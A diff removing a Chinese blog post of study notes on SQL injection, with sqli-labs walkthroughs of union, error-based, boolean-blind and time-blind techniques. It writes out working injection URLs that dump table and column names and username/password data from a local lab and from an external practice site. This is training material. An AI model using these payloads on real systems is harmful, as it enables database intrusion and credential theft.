@@ -142,239 +142,7 @@ MathJax = {
         
       </div>
       <div class="markdown-body">
-        <h1 id="SQL注入（SQL-Injection）"><a href="#SQL注入（SQL-Injection）" class="headerlink" title="SQL注入（SQL Injection）"></a>SQL注入（SQL Injection）</h1><h2 id="定义（过程）"><a href="#定义（过程）" class="headerlink" title="定义（过程）"></a>定义（过程）</h2><p>将SQL代码插入或添加到用户的输入参数中</p>
-<p>利用现有应用程序的特性，攻击者通过在Web表单、URL等用户可输入数据的地方插入恶意SQL语句，一并原有的SQL语句被代库执行。</p>
-<p>也就是说，SQL命令就是前端应用程序和后端数据库之间的接口。</p>
-<p>静态网页：html或htm，不存在交互，不存在SQL注入漏洞。</p>
-<p>伪静态网页：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\1.png" alt></p>
-<h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>1.数据与代码未严格分离</p>
-<p>2.用户提交的参数数据未做充分检查过滤即被代入到SQL命令中，从而改变原有SQL命令的语义，且被数据库成功执行。</p>
-<h2 id="常见过程"><a href="#常见过程" class="headerlink" title="常见过程"></a>常见过程</h2><p>1.客户端（发送请求）：用户请求URL，但用户对其中的参数值等数据进行修改</p>
-<p>2.服务端：未对用户数据进行检验检查，直接把用户输入的语句代入SQL命令中，即已改变SQL命令语义。此时服务端会发至数据库引擎。</p>
-<p>3.数据库引擎：未对SQL语句进行判别，直接执行修改后的SQL命令。执行后返回给服务端。</p>
-<p>4.服务端：将注入结果返回给客户端。</p>
-<p>5.客户端：得知响应结果，并根据上一次注入获取的敏感信息继续构造注入语句，注入其他信息。</p>
-<h2 id="SQL-injection参数"><a href="#SQL-injection参数" class="headerlink" title="SQL injection参数"></a>SQL injection参数</h2><h2 id="在渗透测试过程中的作用"><a href="#在渗透测试过程中的作用" class="headerlink" title="在渗透测试过程中的作用"></a>在渗透测试过程中的作用</h2><p>如：</p>
-<p>绕过登陆验证（使用万能密码登录网站后台）</p>
-<p>获取敏感数据（比如网站管理员账号、密码等）</p>
-<p>对文件系统进行操作（列出网站目录、读取敏感文件或写入文件）</p>
-<p>注册表操作（读取、写入、删除注册表）</p>
-<p>当权限比较大（系统管理员）便可以远程执行系统命令</p>
-<h2 id="出现位置"><a href="#出现位置" class="headerlink" title="出现位置"></a>出现位置</h2><p>URL参数、HTTP包头（cookie、host参数等）、搜索框（登录框）、目录名、文件名等与数据库有交互关系的地方。当程序未对用户输入的数据进行有效的检查和过滤，直接代入SQL语句执行，此时便可能产生SQL注入漏洞。即最普遍的漏洞是由于参数值过滤不严导致的。</p>
-<h2 id="SQL注入漏洞寻找方式"><a href="#SQL注入漏洞寻找方式" class="headerlink" title="SQL注入漏洞寻找方式"></a>SQL注入漏洞寻找方式</h2><p>1.使用工具：</p>
-<p>优点：自动化、范围广、效率高；</p>
-<p>缺点：误报、漏报，测试方法有限。</p>
-<p>常用漏洞扫描工具：Safe3wvs、BurpSuite、Appscan、Acunetix WVS</p>
-<p>2.手工测试</p>
-<p>优点：测试方法灵活（写的时候已经固定）；</p>
-<p>缺点：效率低、范围小，会因测试人员技术水平而异</p>
-<h2 id="SQL注入漏洞判断依据"><a href="#SQL注入漏洞判断依据" class="headerlink" title="SQL注入漏洞判断依据"></a>SQL注入漏洞判断依据</h2><p>根据客户端（页面）返回的结果来判断提交的测试语句是否被数据库引擎执行。如果测试语句被代库执行，说明存在注入漏洞。故需要先构造测试语句。</p>
-<h3 id="常见SQL测试语句"><a href="#常见SQL测试语句" class="headerlink" title="常见SQL测试语句"></a>常见SQL测试语句</h3><p>数字型：And 1 = 1</p>
-<p>字符型：And ‘1’ = ‘1</p>
-<h3 id="注释字符"><a href="#注释字符" class="headerlink" title="注释字符"></a>注释字符</h3><p>SQL Server和Oracle：</p>
-<p>—用于单行注释</p>
-<p>/<em> </em>/用于多行注释</p>
-<p>Mysql：</p>
-<p>除了以上两个注释符号，还有#用于单行注释</p>
-<h2 id="实操过程"><a href="#实操过程" class="headerlink" title="实操过程"></a>实操过程</h2><p>手工：</p>
-<p>1.拿到URL判断是否存在SQL注入，如：”and 1=1、and 1=2”</p>
-<p>2.若返回正常界面，则初步判断当前URL存在SQL注入</p>
-<p>3.执行基本测试语句，如判断属于哪个数据库、数据库版本、当前使用的数据库等</p>
-<p>工具：</p>
-<p>SQLmap</p>
-<p>命令：sqlmap.py -u “URL地址” -p 指定注入参数</p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>搜索引擎命令</p>
-<p>inurl：查找url中包含xxx的网页</p>
-<h2 id="sqli-labs手工注入"><a href="#sqli-labs手工注入" class="headerlink" title="sqli-labs手工注入"></a>sqli-labs手工注入</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>（1）mysql数据库结构:</p>
-<p>mysql数据库5.0以上版本有一个自带的数据库叫做information_schema，该数据库下面有两个表一个是tables和columns。</p>
-<p>​    tables表：</p>
-<p>​        table_name字段下面是所有数据库存在的表名</p>
-<p>​        table_schema字段下是所有表名对应的数据库名</p>
-<p>​    columns表：</p>
-<p>​        colum_name字段下是所有数据库存在的字段名。</p>
-<p>​        columns_schema字段下是所有表名对应的数据库。<br><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\2.png" style="zoom: 67%;"></p>
-<p>在如下目录中cmd，进入mysql：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\21.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\22.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\23.png" style="zoom:80%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\24.png" style="zoom:67%;"></p>
-<p>（2）SQL注入类型</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\4.png" style="zoom: 67%;">、</p>
-<p>（3）联合查询</p>
-<p>联合注入<strong>思路</strong>：</p>
-<p>union联合</p>
-<p>合并：将多条查询语句的结合并成一个结果，union注入攻击位一种手工测试。</p>
-<p>联合注入<strong>步骤</strong>：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\3.png" style="zoom:67%;"></p>
-<p>（4）其中空格编码为20%，’编码为27%\</p>
-<h3 id="SQL注入类型——联合查询（Less-1，2，3，4）"><a href="#SQL注入类型——联合查询（Less-1，2，3，4）" class="headerlink" title="SQL注入类型——联合查询（Less-1，2，3，4）"></a>SQL注入类型——联合查询（Less-1，2，3，4）</h3><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p>登录靶场，目标找账号密码，第一关显示如下：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\5.png" alt></p>
-<p>提示输入数字值的ID作为参数，输入?id=1</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\6.png" alt></p>
-<p>为了显示方便，添加代码以便显示语句：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\7.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\8.png" alt></p>
-<h5 id="first"><a href="#first" class="headerlink" title="first"></a>first</h5><p>一般都先在语句后加’，判断是否有sql注入，求闭合字符：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\9.png" alt></p>
-<p>发现报错（界面变化），证明该网站和数据库确实有交互，进一步开始找漏洞</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\10.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\12.png" alt></p>
-<p>and 1=1和and 1=2出现不同结果，说明闭合字符寻找正确，即为’</p>
-<p>且因为该页面存在回显，所以我们可以使用联合查询</p>
-<p>其中</p>
-<p>and中若一方是false就报错</p>
-<p>看源码便于理解：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\11.png" alt></p>
-<p>在箭头处进行注入</p>
-<h5 id="second"><a href="#second" class="headerlink" title="second"></a>second</h5><p>求列数</p>
-<p>当为3时显示正常，为4时报错，即表示太多了，即确定为3列</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\18.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\19.png" alt></p>
-<h5 id="third"><a href="#third" class="headerlink" title="third"></a>third</h5><p>联合查询求显示位</p>
-<p>发现只显示id=1时的值，其他显示不出</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\20.png" alt></p>
-<p>故修改命令，让其显示后面的内容：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\25.png" alt></p>
-<h5 id="forth"><a href="#forth" class="headerlink" title="forth"></a>forth</h5><p>爆库——爆表——爆列——爆段</p>
-<p>说明该网页使用security数据库：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\26.png" alt></p>
-<p>看了表名不止一个，因此需要用连接符连接，from后跟表名存在的位置，这样查出了数据库中所有的表名：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\27.png" alt></p>
-<p>故用where后跟条件(查表名，即条件为表存在哪个数据库中)，定位到security数据库：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span> <span class="string">&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\28.png" alt></p>
-<p>若未使用group_concat()：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\29.png" alt></p>
-<p>用limit让其一个表一个表读（limit参数从0开始，后面一个参数’1’表示接下来显示1个表），此时显示：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\30.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\31.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\32.png" alt></p>
-<p>把table改为column，加上限制条件（从users表中查）：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span> <span class="string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\33.png" alt></p>
-<p>最后把column改为username、password，from users表中：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span> <span class="string">&#x27; union select 1,2,(select group_concat(username,password) from users) --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\34.png" alt></p>
-<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>提示显示同第一关，先加’，结果显示与数据库有交互</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\13.png" alt></p>
-<p>输入and 1=1，发现结果报错，说明闭合字符有问题：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\14.png" alt></p>
-<p>故去掉’，发现显示正常，说明不需要闭合字符，为数字型：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\15.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\16.png" alt></p>
-<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>提示显示同第一关，先加’，结果显示与数据库有交互</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\17.png" alt></p>
-<h4 id="sql注入练习"><a href="#sql注入练习" class="headerlink" title="sql注入练习"></a>sql注入练习</h4><p><a target="_blank" rel="noopener" href="http://pu2lh35s.ia.aqlab.cn/">http://pu2lh35s.ia.aqlab.cn/</a></p>
-<p>初始界面如下，仅一处可点：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\44.png" style="zoom: 50%;"></p>
-<p>点击后出现如下结果（正常页面）：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\45.png" style="zoom: 50%;"></p>
-<p>接着用’判断是否存在sql注入，发现页面发生变化（错误页面）：<br><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\46.png" style="zoom: 67%;"></p>
-<p>继续测试，发现页面仍有问题，与预期不符，说明闭合方式错误：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\47.png" style="zoom:67%;"></p>
-<p>说明为数字型：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\48.png" style="zoom:50%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\49.png" style="zoom:67%;"></p>
-<p>测出类型后，测列数，说明两个字段有显示：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\50.png" style="zoom:50%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\51.png" style="zoom:50%;"></p>
-<p>接下来测具体显示位（联合查询），此时页面没有信息，于是想让前面部分不输出：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\52.png" style="zoom:50%;"></p>
-<p>找到信息2：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\53.png" style="zoom:50%;"></p>
-<p>同理：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\54.png" style="zoom:50%;"></p>
-<p>找到显示位后，先查数据库：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\55.png" style="zoom:50%;"></p>
-<p>接着查表：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>pu2lh35s.ia.aqlab.cn<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;maoshe&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\56.png" style="zoom:50%;"></p>
-<p>接着查列：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>pu2lh35s.ia.aqlab.cn<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;maoshe&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\57.png" style="zoom:50%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\58.png" style="zoom:50%;"></p>
-<h3 id="SQL注入类型——报错注入（Less-5，6）"><a href="#SQL注入类型——报错注入（Less-5，6）" class="headerlink" title="SQL注入类型——报错注入（Less-5，6）"></a>SQL注入类型——报错注入（Less-5，6）</h3><p>判断方法：</p>
-<p>页面无回显位</p>
-<p>常用报错函数E</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml()         是mysql对xml文档数据进行查询和修改的xpath函数</span><br><span class="line">extractvalue()      是mysql对xml文档数据进行查询的xpath函数</span><br><span class="line"><span class="built_in">floor</span>()             mysql中用来取整的函数</span><br><span class="line"><span class="built_in">exp</span>()               此函数返回e(自然对数的底)指数x的幂值</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\35.png" alt></p>
-<p>其中会用到0x7e（为波浪线的十六进制），作为标记，看是否完全显示完。</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\36.png" alt></p>
-<p>报错注入步骤：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\37.png" style="zoom: 67%;"></p>
-<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><h5 id="first-1"><a href="#first-1" class="headerlink" title="first"></a>first</h5><p>提示显示同第一关：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\38.png" alt></p>
-<p>先加’，报错，说明存在交互：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\39.png" alt></p>
-<p>继续测试：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\40.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\41.png" alt></p>
-<p>第五关根据页面结果得知是字符型但和前四关不同。页面虽然有东西，但是只有对于请求对错出现不一样页面其余的就没有了，页面无回显位，考虑报错注入。</p>
-<h5 id="second-1"><a href="#second-1" class="headerlink" title="second"></a>second</h5><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\42.png" alt></p>
-<p>或：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\43.png" alt></p>
-<h3 id="SQL注入类型——布尔盲注-Less-8"><a href="#SQL注入类型——布尔盲注-Less-8" class="headerlink" title="SQL注入类型——布尔盲注(Less-8)"></a>SQL注入类型——布尔盲注(Less-8)</h3><p>判断方法：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\59.png" alt></p>
-<p>操作步骤：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\60.png" alt></p>
-<p>常用函数：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\61.png" alt></p>
-<p>其中：substr的起始数字为1，括号中第一个数字x表示从第x位开始截取，第二个数字xx表示截取xx位。</p>
-<p>区别limit的起始数字为0。</p>
-<p>acsii对应：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\62.png" alt></p>
-<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><h5 id="first-求闭合字符"><a href="#first-求闭合字符" class="headerlink" title="first 求闭合字符"></a>first 求闭合字符</h5><p>起始界面是一样的，但是发现输入’之后没有报错信息，只是界面变化（You are in消失）（与Less-5不同）：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\64.png" alt></p>
-<p>进行闭合字符检测：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\65.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\66.png" alt></p>
-<p>说明’为闭合字符，且无显示位也无报错信息，确定为布尔盲注</p>
-<h5 id="second-求数据库名长度length"><a href="#second-求数据库名长度length" class="headerlink" title="second 求数据库名长度length()"></a>second 求数据库名长度length()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length((<span class="keyword">select</span> database()))</span><br></pre></td></tr></table></figure>
-<p>一般数据库名没有太长（1-10），先用&gt;、&lt;，借助二分法缩小范围，再用=猜数</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\67.png" alt></p>
-<h5 id="third-求数据库名的ascii值-substr"><a href="#third-求数据库名的ascii值-substr" class="headerlink" title="third 求数据库名的ascii值 substr"></a>third 求数据库名的ascii值 substr</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span></span><br><span class="line"></span><br><span class="line">ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span></span><br></pre></td></tr></table></figure>
-<p>第二个数字表示截取位数，固定为1，太麻烦，故利用BP抓包爆破。</p>
-<p>首先打开抓包：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\68.png" alt></p>
-<p>抓到后，转到爆破模块（右键—&gt;Send to Intruder），通过返回的长度（正确界面和错误界面长度不同）确定结果：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\69.png" alt></p>
-<p>设置payloads：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\70.png" style="zoom: 67%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\73.png" style="zoom:67%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\74.png" alt></p>
-<p>对应记录下来：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\71.png" style="zoom:67%;"></p>
-<p>找ascii：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\72.png"></p>
-<h5 id="forth-求表的数量count"><a href="#forth-求表的数量count" class="headerlink" title="forth 求表的数量count()"></a>forth 求表的数量count()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)=4 --+</span></span><br></pre></td></tr></table></figure>
-<p>求出数量后便于遍历</p>
-<h5 id="fifth-求表的长度"><a href="#fifth-求表的长度" class="headerlink" title="fifth 求表的长度"></a>fifth 求表的长度</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 猜第一个表</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 截取第一个表的第一个字母</span><br><span class="line">substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure>
-<p>接下来一个表一个表的爆破</p>
-<h3 id="SQL注入类型——时间盲注-Less-9"><a href="#SQL注入类型——时间盲注-Less-9" class="headerlink" title="SQL注入类型——时间盲注(Less-9)"></a>SQL注入类型——时间盲注(Less-9)</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\63.png" alt></p>
-<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><h5 id="first-2"><a href="#first-2" class="headerlink" title="first"></a>first</h5><p>输入’，发现无报错无回显，且页面无变化，不知道是否与数据库有交互</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\75.png" alt></p>
-<p>用sleep()函数求闭合字符，但要注意排除网络原因（将页面沉睡时间设长一些）</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\76.png" alt></p>
-<p>也可直接查看页面返回时间：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\77.png" alt></p>
-<p>若无’，发现sleep函数没生效，说明语句有误：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\78.png" alt></p>
-<p>由此判断’是闭合字符</p>
-<h5 id="second-2"><a href="#second-2" class="headerlink" title="second"></a>second</h5><p>查询数据库名</p>
-<p>if(条件,命令1,命令2) </p>
-<p>若条件正确，执行命令1；否则执行命令2</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="string">&#x27; and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>
-<p>此时无法应用BP爆破，因返回相同，无法通过长度判断</p>
-<h3 id="SQL注入类型——堆叠查询-Less-38"><a href="#SQL注入类型——堆叠查询-Less-38" class="headerlink" title="SQL注入类型——堆叠查询(Less-38)"></a>SQL注入类型——堆叠查询(Less-38)</h3><p>即一次性执行多个sql语句</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\79.png" alt></p>
-<h4 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h4><p>使用联合查询、报错注入亦可</p>
